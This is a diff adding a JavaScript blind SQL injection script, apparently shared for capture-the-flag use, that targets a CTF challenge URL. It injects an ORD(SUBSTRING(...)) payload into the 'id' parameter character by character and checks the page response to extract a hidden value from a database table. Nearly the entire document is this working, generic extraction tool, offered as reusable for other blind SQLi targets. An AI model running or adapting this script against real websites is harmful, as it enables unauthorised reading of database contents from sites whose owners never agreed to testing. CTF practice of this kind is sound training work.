@@ -1,0 +1,51 @@
+This may not work for all blind SQLi, used this for 2 CTF events:
+
+(async () => {
+  const baseURL = "https://the-needle.chall.wwctf.com/?id=";
+  const charset = Array.from({ length: 95 }, (_, i) => String.fromCharCode(i + 32)); // ASCII 32–126
+  const offset = 0; // Only one row likely contains the flag
+  const maxLen = 80; // Reasonable flag length cap
+  let flag = "";
+  const sleep = ms => new Promise(res => setTimeout(res, ms));
+
+  console.log(`🔍 Starting blind SQLi on OFFSET ${offset}`);
+
+  for (let i = 1; i <= maxLen; i++) {
+    let found = false;
+
+    for (let c of charset) {
+      const ascii = c.charCodeAt(0);
+      const payload = `1' AND ORD(SUBSTRING((SELECT information FROM info LIMIT 1 OFFSET ${offset}),${i},1))=${ascii}-- `;
+      const url = baseURL + encodeURIComponent(payload);
+
+      try {
+        const res = await fetch(url);
+        const text = await res.text();
+
+        if (text.includes("Yes, We found it")) {
+          flag += c;
+          console.log(`✅ Char ${i}: '${c}' → ${flag}`);
+          found = true;
+          break;
+        }
+      } catch (err) {
+        console.warn(`⚠️ Network error at char ${i}. Retrying...`);
+        await sleep(500);
+        i--; // retry
+        break;
+      }
+
+      await sleep(50); // Be polite
+    }
+
+    if (!found) {
+      console.log("❌ Flag ended (no match):", flag);
+      break;
+    }
+
+    if (flag.endsWith("}")) {
+      console.log("🎉 FLAG FOUND:", flag);
+      break;
+    }
+  }
+})();
